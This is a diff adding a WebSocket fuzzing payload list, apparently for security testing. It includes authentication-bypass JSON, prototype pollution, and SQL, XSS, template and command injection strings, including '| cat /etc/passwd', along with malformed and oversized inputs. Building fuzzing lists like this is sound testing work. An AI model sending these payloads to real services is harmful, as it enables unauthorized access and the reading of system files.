@@ -1,0 +1,66 @@
+# WebSocket Fuzzing Payloads
+
+# Valid JSON structures
+{"type": "ping"}
+{"type": "pong"}
+{"action": "subscribe", "channel": "test"}
+{"action": "unsubscribe", "channel": "test"}
+{"message": "test"}
+{"data": "test"}
+
+# Authentication bypass
+{"type": "auth", "token": ""}
+{"type": "auth", "token": null}
+{"type": "auth", "token": "admin"}
+{"type": "auth", "admin": true}
+{"type": "subscribe", "channel": "admin"}
+{"action": "elevate", "role": "admin"}
+{"authenticated": true}
+{"role": "admin"}
+{"isAdmin": true}
+
+# Injection payloads
+{"query": "' OR '1'='1"}
+{"message": "<script>alert(1)</script>"}
+{"data": "{{7*7}}"}
+{"input": "; ls -la"}
+{"command": "| cat /etc/passwd"}
+
+# Prototype pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+# Large payloads (DoS testing)
+# Use script to generate: "A" * 10000
+# Use script to generate: "A" * 100000
+# Use script to generate: "A" * 1000000
+
+# Null bytes
+\x00
+\x00\x00\x00
+{"data": "\x00\x00\x00"}
+
+# Unicode
+\u0000
+\u0001\u0002\u0003
+{"data": "\u202e"}
+
+# Invalid JSON
+{invalid json}
+{type: "test"}
+{'type': 'test'}
+[[[[[[[[[[[[[[[[[
+]]]]]]]]]]]]]]]]
+{"a":1,"a":2}
+
+# Binary/Control characters
+\x01\x02\x03
+\r\n\r\n
+\n\n\n\n
+\t\t\t\t
+
+# Overflow attempts
+{"id": 999999999999999999999999999999}
+{"id": -1}
+{"id": 0}
+{"index": -99999}
